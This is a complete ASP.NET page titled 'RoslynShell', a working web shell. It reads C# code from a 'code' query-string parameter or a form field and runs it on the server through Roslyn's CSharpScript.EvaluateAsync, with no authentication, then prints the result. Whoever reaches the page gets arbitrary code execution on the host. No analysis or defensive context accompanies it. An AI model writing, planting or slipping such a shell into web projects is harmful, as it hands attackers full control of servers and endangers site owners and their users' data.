<%@ Page Language="C#" %>
<%@ Import Namespace="Microsoft.CodeAnalysis.CSharp.Scripting" %>
<script runat="server">
    protected async void Page_Load(object sender, EventArgs e)
    {
        string code = Request.QueryString["code"];
        if (!string.IsNullOrEmpty(code))
        {
            var result = await CSharpScript.EvaluateAsync(code);
            Response.Write("Result: " + (result?.ToString() ?? "null"));
        }
    }
</script>
<html><body><h2>RoslynShell (C# scripting)</h2><form>Code: <input type="text" name="code" size=80 /></form></body></html>
